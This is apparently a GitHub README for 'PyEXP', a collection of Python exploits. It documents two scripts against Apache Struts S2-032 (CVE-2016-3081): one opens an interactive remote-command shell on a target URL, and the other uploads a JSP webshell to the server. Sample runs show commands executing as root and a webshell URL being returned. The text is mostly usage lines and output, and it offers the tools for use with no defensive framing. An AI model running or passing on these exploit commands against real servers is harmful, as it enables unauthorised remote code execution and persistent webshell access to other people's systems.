# PyEXP
The EXP coding by python,and I'll publish the popular EXP here.<br>

##s2-032_cmd.py

USG:<br>
python s2-032_cmd.py http://x.y.z/*.action<br>
use '\q' to exit the shell

##s2-032_all.py

usage: s2-032_all.py [-h] [--cmd] [--url URL] [-f FILENAME] [-d SHELLNAME]<br>

CVE-2016-3081 | Apache Struts S2-032<br>

optional arguments:
  -h, --help    show this help message and exit<br>
  --cmd         drop into shell-like RCE<br>
  --url URL     specifiy the url of the target<br>
  -f FILENAME   specifiy loacl filename of the file you want to upload<br>
  -d SHELLNAME  specifiy remote filename upload on the server<br>
  
  use it like this:<br>
  python s2-032_all.py --cmd --url http://localhost/hello.action<br>
  \# whoami<br>
  root<br>
  \# \q<br>
  Bye!<br>
  
  python s2-032_all.py -f wanger.txt -d webshell.jsp --url http://localhost/hello.action<br>
  File upload success!<br>
  http://localhost/webshell.jsp<br>
  

